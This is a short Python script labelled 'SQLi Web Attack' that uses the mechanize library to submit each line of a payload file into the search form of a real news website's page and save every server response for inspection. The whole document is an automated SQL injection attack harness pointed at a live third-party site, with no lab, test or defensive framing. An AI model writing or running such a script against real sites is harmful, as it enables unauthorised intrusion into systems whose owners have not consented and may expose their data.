"""SQLi Web Attack."""

import mechanize


url = "https://www.politico.com/tipsheets/morning-money"
attack_no = 1
browser = mechanize.Browser()

with open('websites.txt') as v:
    for line in v:
        browser.open(url)
        browser.select_form(nr=0)
        browser['q'] = line
        res = browser.submit()
        content = res.read()

        output = open('response/' + str(attack_no) + '.txt', 'w')
        output.write(str(content))
        output.close()
        print(attack_no)
        attack_no += 1
